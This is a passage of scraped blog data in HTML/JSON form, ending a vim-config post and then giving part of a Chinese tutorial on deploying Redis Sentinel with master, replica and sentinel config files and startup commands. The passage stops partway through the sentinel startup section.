id=\"crayon-5bab66fbd2212112459203-2\"><span class=\"crayon-s\">set autoindent</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-3\"><span class=\"crayon-s\">set smartindent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-4\"><span class=\"crayon-s\">set tabstop=4</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-5\"><span class=\"crayon-s\">set shiftwidth=4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-6\"><span class=\"crayon-s\">set expandtab</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-7\"><span class=\"crayon-s\">set smarttab</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-8\"><span class=\"crayon-s\">\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Display</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">format</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-9\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">number</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-10\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">textwidth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">80</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-11\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">wrapmargin</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-12\"><span class=\"crayon-e\">set </span><span class=\"crayon-i\">showmatch</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-13\"><span class=\"crayon-s\">\" Search</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-14\"><span class=\"crayon-s\">set hlsearch</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-15\"><span class=\"crayon-s\">set incsearch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-16\"><span class=\"crayon-s\">set ignorecase</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-17\"><span class=\"crayon-s\">set smartcase</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-18\"><span class=\"crayon-s\">\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Browse</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Scroll</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-19\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">scrolloff</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-20\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">laststatus</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-21\"><span class=\"crayon-s\">\" Spell</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-22\"><span class=\"crayon-s\">set spell spelllang=en_us</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-23\"><span class=\"crayon-s\">\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Miscellaneous</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-24\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">nobackup</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-25\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">noswapfile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-26\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">autochdir</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-27\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">undofile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd2212112459203-28\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">visualbell</span></div><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-29\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">errorbells</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114402\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114402votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114402\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/0d181a73d20fcd8df7195c0e0d7d2c0fe6711ea5.jpg"}
{"title": "深入学习 Redis（4）：哨兵", "url": "http://blog.jobbole.com/114382/", "create_date": "2018/09/13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "url_object_id": "7dac2cf4ba2ba6db98a928d39b6db6b4", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Redis", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/kismetv/p/9609938.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在 <a href=\"http://blog.jobbole.com/114194/\" target=\"_blank\">深入学习Redis（3）：主从复制</a> 中曾提到，Redis主从复制的作用有数据热备、负载均衡、故障恢复等；但主从复制存在的一个问题是故障恢复无法自动化。本文将要介绍的哨兵，它基于Redis主从复制，主要作用便是解决主节点故障恢复的自动化问题，进一步提高系统的高可用性。</p>\n<p>文章主要内容如下：首先介绍哨兵的作用和架构；然后讲述哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；然后简要说明哨兵实现的基本原理；最后给出关于哨兵实践的一些建议。文章内容基于Redis 3.0版本。</p>\n<h2>系列文章</h2>\n<p><a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">深入学习Redis（1）：Redis内存模型</a></p>\n<p><a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a></p>\n<p><a href=\"http://blog.jobbole.com/114194/\" target=\"_blank\">深入学习Redis（3）：主从复制</a></p>\n<h1><a name=\"t1\"></a>一、作用和架构</h1>\n<h2><a name=\"t11\"></a>1.  作用</h2>\n<p>在介绍哨兵之前，首先从宏观角度回顾一下Redis实现高可用相关的技术。它们包括：持久化、复制、哨兵和集群，其主要作用和解决的问题是：</p>\n<ul>\n<li>持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。</li>\n<li>复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。</li>\n</ul>\n<p>下面说回哨兵。</p>\n<p>Redis Sentinel，即Redis哨兵，在Redis 2.8版本开始引入。<strong>哨兵的核心功能是主节点的自动故障转移。</strong>下面是Redis官方文档对于哨兵功能的描述：</p>\n<ul>\n<li>监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运作正常。</li>\n<li>自动故障转移（Automatic failover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。</li>\n<li>配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址。</li>\n<li>通知（Notification）：哨兵可以将故障转移的结果发送给客户端。</li>\n</ul>\n<p>其中，监控和自动故障转移功能，使得哨兵可以及时发现主节点故障并完成转移；而配置提供者和通知功能，则需要在与客户端的交互中才能体现。</p>\n<p>这里对“客户端”一词在文章中的用法做一个说明：在前面的文章中，只要通过API访问redis服务器，都会称作客户端，包括redis-cli、Java客户端Jedis等；为了便于区分说明，本文中的客户端并不包括redis-cli，而是比redis-cli更加复杂：redis-cli使用的是redis提供的底层接口，而客户端则对这些接口、功能进行了封装，以便充分利用哨兵的配置提供者和通知功能。</p>\n<h2><a name=\"t12\"></a>2.  架构</h2>\n<p>典型的哨兵架构图如下所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/8b0360c2b6eba06c316535320b2aecd2.png\" alt=\"\"></p>\n<p>它由两部分组成，哨兵节点和数据节点：</p>\n<ul>\n<li>哨兵节点：哨兵系统由一个或多个哨兵节点组成，哨兵节点是特殊的redis节点，不存储数据。</li>\n<li>数据节点：主节点和从节点都是数据节点。</li>\n</ul>\n<h1><a name=\"t2\"></a>二、部署</h1>\n<p>这一部分将部署一个简单的哨兵系统，包含1个主节点、2个从节点和3个哨兵节点。方便起见：所有这些节点都部署在一台机器上（局域网IP：192.168.92.128），使用端口号区分；节点的配置尽可能简化。</p>\n<h2><a name=\"t21\"></a>1.  部署主从节点</h2>\n<p>哨兵系统中的主从节点，与普通的主从节点配置是一样的，并不需要做任何额外配置。下面分别是主节点（port=6379）和2个从节点（port=6380/6381）的配置文件，配置都比较简单，不再详述。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db59547549316\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#redis-6379.conf\r\nport 6379\r\ndaemonize yes\r\nlogfile \"6379.log\"\r\ndbfilename \"dump-6379.rdb\"\r\n\r\n#redis-6380.conf\r\nport 6380\r\ndaemonize yes\r\nlogfile \"6380.log\"\r\ndbfilename \"dump-6380.rdb\"\r\nslaveof 192.168.92.128 6379\r\n\r\n#redis-6381.conf\r\nport 6381\r\ndaemonize yes\r\nlogfile \"6381.log\"\r\ndbfilename \"dump-6381.rdb\"\r\nslaveof 192.168.92.128 6379</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db59547549316-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db59547549316-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-1\"><span class=\"crayon-p\">#redis-6379.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-2\"><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-3\"><span class=\"crayon-e\">daemonize </span><span class=\"crayon-e\">yes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-4\"><span class=\"crayon-i\">logfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"6379.log\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-5\"><span class=\"crayon-i\">dbfilename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"dump-6379.rdb\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-7\"><span class=\"crayon-p\">#redis-6380.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-8\"><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6380</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-9\"><span class=\"crayon-e\">daemonize </span><span class=\"crayon-e\">yes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-10\"><span class=\"crayon-i\">logfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"6380.log\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-11\"><span class=\"crayon-i\">dbfilename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"dump-6380.rdb\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-12\"><span class=\"crayon-i\">slaveof</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.92.128</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-14\"><span class=\"crayon-p\">#redis-6381.conf</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-15\"><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6381</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-16\"><span class=\"crayon-e\">daemonize </span><span class=\"crayon-e\">yes</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-17\"><span class=\"crayon-i\">logfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"6381.log\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db59547549316-18\"><span class=\"crayon-i\">dbfilename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"dump-6381.rdb\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db59547549316-19\"><span class=\"crayon-i\">slaveof</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.92.128</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n\n</div>\n<p>配置完成后，依次启动主节点和从节点：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db62454145910\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis-server redis-6379.conf\r\nredis-server redis-6380.conf\r\nredis-server redis-6381.conf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db62454145910-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db62454145910-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db62454145910-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db62454145910-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">server </span><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">6379.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db62454145910-2\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">server </span><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">6380.conf</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db62454145910-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">server </span><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">6381.conf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n\n</div>\n<p>节点启动后，连接主节点查看主从状态是否正常，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/bf34c119fb79b61250d94a1d6aa7ce26.png\" alt=\"\"></p>\n<h2><a name=\"t22\"></a>2.  部署哨兵节点</h2>\n<p>哨兵节点本质上是特殊的Redis节点。</p>\n<p>3个哨兵节点的配置几乎是完全一样的，主要区别在于端口号的不同（26379/26380/26381），下面以26379节点为例介绍节点的配置和启动方式；配置部分尽量简化，更多配置会在后面介绍。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db66199280519\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#sentinel-26379.conf\r\nport 26379\r\ndaemonize yes\r\nlogfile \"26379.log\"\r\nsentinel monitor mymaster 192.168.92.128 6379 2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db66199280519-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db66199280519-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db66199280519-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db66199280519-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db66199280519-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db66199280519-1\"><span class=\"crayon-p\">#sentinel-26379.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db66199280519-2\"><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26379</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db66199280519-3\"><span class=\"crayon-e\">daemonize </span><span class=\"crayon-e\">yes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db66199280519-4\"><span class=\"crayon-i\">logfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"26379.log\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db66199280519-5\"><span class=\"crayon-e\">sentinel </span><span class=\"crayon-e\">monitor </span><span class=\"crayon-i\">mymaster</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.92.128</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>其中，sentinel monitor mymaster 192.168.92.128 6379 2 配置的含义是：该哨兵节点监控192.168.92.128:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移。</p>\n<p>哨兵节点的启动有两种方式，二者作用是完全相同的：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db6a708228985\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis-sentinel sentinel-26379.conf\r\nredis-server sentinel-26379.conf --sentinel</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" 